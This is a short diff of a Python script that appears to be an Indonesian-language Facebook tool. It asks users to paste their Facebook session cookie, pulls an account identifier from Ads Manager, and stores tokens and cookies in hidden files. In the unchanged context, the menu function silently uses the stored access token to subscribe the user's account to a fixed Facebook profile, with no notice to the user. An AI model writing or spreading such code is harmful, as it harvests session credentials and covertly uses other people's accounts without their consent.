@@ -451,7 +451,7 @@ def login():
 def login_lagi334():
         with requests.Session() as xyz:
             try:
-                coki = input(f"[•] Cookie : ")
+                coki = input("[•] Cookie : ")
                 url = 'https://www.facebook.com/adsmanager/manage/campaigns'
                 req = xyz.get(url,cookies=coki)
                 set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
@@ -463,7 +463,7 @@ def login_lagi334():
             except IOError:
                 Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
                 os.system('rm -rf .token.txt && rm -rf .cok.txt')
-                exit()
+                login()
 
 
 
@@ -472,7 +472,6 @@ def menu(my_name,my_id):
     try:
         tokenx = open('.token.txt','r').read()
         tokenmu.append(tokenx)
-        token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
         requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(tokenmu))
     except IOError:
